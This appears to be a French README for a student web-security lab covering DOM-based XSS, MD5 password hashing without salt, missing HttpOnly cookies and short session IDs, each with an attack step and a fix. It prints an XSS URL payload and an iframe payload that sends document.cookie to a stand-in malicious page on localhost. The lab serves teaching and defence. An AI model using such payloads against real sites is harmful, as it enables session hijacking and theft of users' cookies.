# was-grp11
Groupe 11 (Youssra IBRAHIMI, Io ALFANO, Assia HAFID)
  
## DOM Based XSS  
**Prérequis :**<br/>
Télécharger les fichiers du github, et lancer un serveur localhost sur le port de votre choix dans le dossier was-grp11/<br/>
On peut créer un bouton de la manière suivante http://localhost:port/dom_xss_1/atk_dom_xss_1.html?button=My%20custom%20button <br/>
**Attaque :** <br/>
Aller sur la page http://localhost:port/dom_xss_1/atk_dom_xss_1.html?button=<script>alert(document.cookie)</script> <br/>
Cela va générer une alerte avec le cookie. Le serveur va générer un objet DOM sans vérifier si le code contient un script malveillant. <br/>
**Defense :**<br/>
Pour contrer ce type d’attaque il faut utiliser un outil pour nettoyer le code avant de l’ajouter au DOM. Nous avons utilisé DOMPurify. <br/>
Quand du code JavaScript est repéré, il est supprimé avant d'être ajouté dans le DOM.<br/>
<br/>
## Password Salting
**Prérequis :**<br/>
Télécharger les fichiers du github, et lancer un serveur localhost sur le port de votre choix dans le dossier was-grp11/<br/>
Initilisaliser la base de données en faisant `<sudo mysql < init_db_password.sql>`.<br/>
La page HTML permet de s’authentifier sur le compte de l’administrateur. Le serveur va récupérer le mot de passe de l’administrateur qui vaut MD5(‘admin123’) et va le comparer au mot de passe à tester sur lequel la fonction MD5 a été appliquée.<br/>
De cette manière un attaquant peut facilement retrouver le mot de passe grâce à des rainbow tables.<br/>
**Attaque :** <br/>
http://localhost:port/atk_password.php?password=admin123<br/>
**Defense :**<br/>
Pour générer un nouveau mot de passe nous avons utilisé le code suivant :<br/>
`<$salt = bin2hex(openssl_random_pseudo_bytes(22));>`<br/>
`<$hash = crypt($_GET['password'], "$2a$12$".$salt);>`<br/>
De cette manière un salt est généré aléatoirement pour chaque mot de passe et l’utilisation de rainbow tables devient plus compliqué.<br/>
<br/>
## Session HttpOnly
HttpOnly est un attribut des cookies qui permet d’indiquer aux navigateurs de ne pas laisser des scripts avoir accès aux cookies depuis le DOM. Le site vulnérable n’implémente pas HttpOnly.<br/>
**Attaque :**<br/>
L’attaquant a déposé un lien permettant d’envoyer une requête contenant les cookies sur un site malveillant. HttpOnly est désactivé.<br/>
`<<iframe src="javascript:document.location='http://localhost:8089/bad_session_httponly.php?cookie='+document.cookie"></iframe>>`<br/>
**Defense :**<br/>
Pour protéger ce site de ce genre d’attaque, il faut préciser aux navigateurs d’utiliser HttpOnly. De cette manière, un attaquant ne pourra pas récupérer des données contenues dans les cookies.<br/>
<br/>
## Session ID Length
**Attaque :**<br/>
Le site vulnérable créé un cookie en faisant un hachage d'une longueur de 64 bits. Pour exploiter la vulnérabilité il faut utiliser des rainbows tables composé de hachage et trouver le bon mot de passe qui génère le bon hachage.<br/>
**Defense :**<br/>
Pour améliorer la défense du site il faut augmenter la taille du session ID. Elle doit être de 128 bits minimum. Le nouveau site génère les session ID avec des hachages de 128 bits.<br/>
